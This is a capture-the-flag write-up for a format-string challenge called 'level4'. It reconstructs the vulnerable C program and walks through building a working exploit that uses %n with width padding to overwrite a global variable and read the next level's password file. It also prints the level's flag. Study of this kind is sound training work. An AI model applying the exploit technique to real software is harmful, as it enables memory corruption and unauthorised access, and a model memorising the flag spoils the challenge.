# level4 — format string: write a large value with width padding

**Teaches:** using `%<width>d` so `%n` can write a big number. Same family as level3.

## 1–2. Reconstructed C
```c
int m = 0;
int p(char *buffer) { printf(buffer); return 0; }      // the format-string bug
int n(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    p(buffer);
    if (m == 16930116)                                 // 0x01025544
        system("/bin/cat /home/user/level5/.pass");
    return 0;
}
int main(void) { n(); return 0; }
```

## 3. The vulnerability
Same `printf(buffer)` bug, but now `m` must equal **16930116**. You can't print
16 million padding bytes literally — you inflate the count with a width field.

## 4. Step by step
1. `disassemble n`/`p` → `printf` on buffer; `cmp m,0x1025544`; `m` at `0x08049810`.
2. Locate your buffer:
   ```
   $ python -c 'print "aaaa" + " %x"*15' | ./level4
   ... 61616161 ...      # count the fields: "aaaa" is argument #12
   ```
3. Bytes already printed before `%n` must total 16930116. The address is 4 of
   them, so pad the remaining `16930116 - 4 = 16930112` with `%16930112d`.

## 5. Exploit
```
python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/exploit
cat /tmp/exploit - | ./level4
```
**Why it works:** `%16930112d` prints one stack value padded to 16,930,112
characters; plus the 4 address bytes = 16,930,116 printed. `%12$n` writes that
count into argument #12 (the address of `m`). The check passes and `system`
cats level5's pass directly (so you don't even need to keep stdin open here).

Flag → `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
